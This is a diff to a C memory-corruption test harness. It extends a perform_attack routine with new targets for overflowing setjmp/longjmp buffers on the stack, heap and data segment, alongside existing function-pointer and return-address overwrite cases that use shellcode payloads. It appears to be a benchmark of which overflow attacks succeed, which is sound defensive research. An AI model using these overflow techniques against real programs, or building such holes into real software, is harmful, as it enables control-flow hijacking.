@@ -32,6 +32,8 @@ struct attackme data_struct = {"AAAAAAAA", &fooz};
 
 struct pointer_struct data_indirect;
 
+struct jmp_struct data_jmp_struct;
+
 void generate_payload() {
 
   static struct attackme bss_struct = {"AAAAAAAA", &fooz};
@@ -81,7 +83,7 @@ boolean is_attack_possible() {
 }
 
 
-void perform_attack(void (*stack_func_ptr_param)()) {  
+void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param) {  
 
 
   char buf[BUFFER_SIZE];
@@ -94,6 +96,16 @@ void perform_attack(void (*stack_func_ptr_param)()) {
   int val_struct;
   val_struct = setjmp(stack_jmp_struct.env_buffer);
 
+  struct jmp_struct* heap_jmp_struct = (struct jmp_struct*) malloc(sizeof(struct jmp_struct));
+  int val_heap;
+  val_heap = setjmp(heap_jmp_struct->env_buffer);
+
+  int val_data;
+  val_data = setjmp(data_jmp_struct.env_buffer);
+
+  int val_stack_param;
+  val_stack_param = setjmp(stack_jmp_buf_param);
+
   struct pointer_struct* heap_indirect = (struct pointer_struct*) malloc(sizeof(struct pointer_struct));
 
   struct attackme stack_struct;
@@ -103,11 +115,10 @@ void perform_attack(void (*stack_func_ptr_param)()) {
   heap_struct->func_ptr = &fooz;
 
   attack.technique = INDIRECT;
-  attack.code_ptr = STRUCT_FUNC_PTR_HEAP;
+  attack.code_ptr = LONGJMP_BUF_DATA;
   attack.location = STACK;
 
   payload.size = shellcode_no_noop_size;
-
 
   // set the buffer to be used
   switch(attack.location) {
@@ -115,10 +126,16 @@ void perform_attack(void (*stack_func_ptr_param)()) {
       if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
         payload.overflow_ptr = payload.buffer = stack_struct.buffer;
         payload.target_addr = &stack_struct.func_ptr;
-      } else if (attack.technique == DIRECT) {
+      }
+      else if (attack.technique == DIRECT && attack.code_ptr == LONGJMP_BUF_STACK) {
+        payload.overflow_ptr = payload.buffer = stack_jmp_struct.buf;
+        payload.target_addr = &stack_jmp_struct.env_buffer;
+      }
+      else if (attack.technique == DIRECT) {
         payload.overflow_ptr = payload.buffer = buf;
         payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
-      } else {
+      }
+      else {
         payload.buffer = stack_indirect.buf;
         payload.target_addr = &stack_indirect.mem_ptr;
       }
@@ -128,10 +145,16 @@ void perform_attack(void (*stack_func_ptr_param)()) {
       if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
         payload.overflow_ptr = payload.buffer = heap_struct->buffer;
         payload.target_addr = &heap_struct->func_ptr;
-      } else if (attack.technique == DIRECT) {
+      }
+      else if (attack.technique == DIRECT && attack.code_ptr == LONGJMP_BUF_HEAP) {
+        payload.overflow_ptr = payload.buffer = heap_jmp_struct->buf;
+        payload.target_addr = &heap_jmp_struct->env_buffer;
+      } 
+      else if (attack.technique == DIRECT) {
         payload.overflow_ptr = payload.buffer = malloc(BUFFER_SIZE);
         payload.target_addr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
-      } else {
+      }
+      else {
         payload.buffer = heap_indirect->buf;
         payload.target_addr = &heap_indirect->mem_ptr;
       }
@@ -141,10 +164,16 @@ void perform_attack(void (*stack_func_ptr_param)()) {
       if (attack.technique == DIRECT && attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
         payload.overflow_ptr = payload.buffer = data_struct.buffer;
         payload.target_addr = &data_struct.func_ptr;
-      } else if (attack.technique == INDIRECT) {
+      }
+      else if (attack.technique == DIRECT && attack.code_ptr == LONGJMP_BUF_DATA) {
+        payload.overflow_ptr = payload.buffer = data_jmp_struct.buf;
+        payload.target_addr = &data_jmp_struct.env_buffer;
+      }
+      else if (attack.technique == INDIRECT) {
         payload.buffer = data_indirect.buf;
         payload.target_addr = &data_indirect.mem_ptr;
-      } else {
+      }
+      else {
         exit(1);
       }
       payload.overflow_ptr = payload.buffer;
@@ -169,6 +198,17 @@ void perform_attack(void (*stack_func_ptr_param)()) {
       case FUNC_PTR_STACK_PARAM:
         payload.overflow_ptr = &stack_func_ptr_param;
         break;
+      case LONGJMP_BUF_STACK:
+        payload.overflow_ptr = &stack_jmp_struct.env_buffer;
+        break;
+      case LONGJMP_BUF_HEAP:
+        payload.overflow_ptr = &heap_jmp_struct->env_buffer;
+        break;
+      case LONGJMP_BUF_DATA:
+        payload.overflow_ptr = &data_jmp_struct.env_buffer;
+        break;
+      case LONGJMP_BUF_STACK_PARAM:
+        payload.overflow_ptr = &stack_jmp_buf_param;
    }
   }
 
@@ -198,6 +238,15 @@ void perform_attack(void (*stack_func_ptr_param)()) {
       case FUNC_PTR_STACK_PARAM:
         stack_func_ptr_param();
         break;
+      case LONGJMP_BUF_STACK:
+        longjmp(stack_jmp_struct.env_buffer, 7);
+        break;
+      case LONGJMP_BUF_HEAP:
+        longjmp(heap_jmp_struct->env_buffer, 7);
+        break;
+      case LONGJMP_BUF_DATA:
+        longjmp(data_jmp_struct.env_buffer, 7);
+        break;
     }
   }
 
@@ -207,5 +256,6 @@ void perform_attack(void (*stack_func_ptr_param)()) {
 }
 
 int main() {
-  perform_attack(&fooz);
+  jmp_buf jb;
+  perform_attack(&fooz, jb);
 }
